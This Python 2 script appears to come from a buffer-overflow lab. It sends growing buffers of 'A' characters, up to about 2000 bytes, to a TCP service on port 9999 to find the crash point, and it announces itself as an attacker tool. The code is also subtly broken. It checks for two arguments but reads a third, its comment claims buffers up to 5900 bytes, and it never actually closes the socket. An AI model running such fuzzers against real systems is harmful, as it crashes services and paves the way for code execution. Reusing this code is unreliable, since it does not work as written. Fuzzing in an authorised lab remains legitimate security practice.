#!/usr/bin/python

import socket 
import sys

host='192.168.187.128'
port=9999


if len(sys.argv) == 2:
    host=sys.argv[1]
    port=sys.argv[2]

# Create an array of bufers, from 1 to 5900, with increments of 100

buffer=['A']
counter=100

while len(buffer) <=20:
    buffer.append("A"*counter)
    counter=counter+100

print "\n Attacker Start! "
print "Host: {} {}".format(host,port)
 
for string in buffer:
    try: 
        print "Fuzzing with %s bytes" % len(string)
        serverSocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        connect = serverSocket.connect((host,port))
        data = serverSocket.recv(1024)
        serverSocket.send(string)
        print "\n completed"
    except socket.error as e:
        print "\error"+str(e)
    finally:
        serverSocket.close
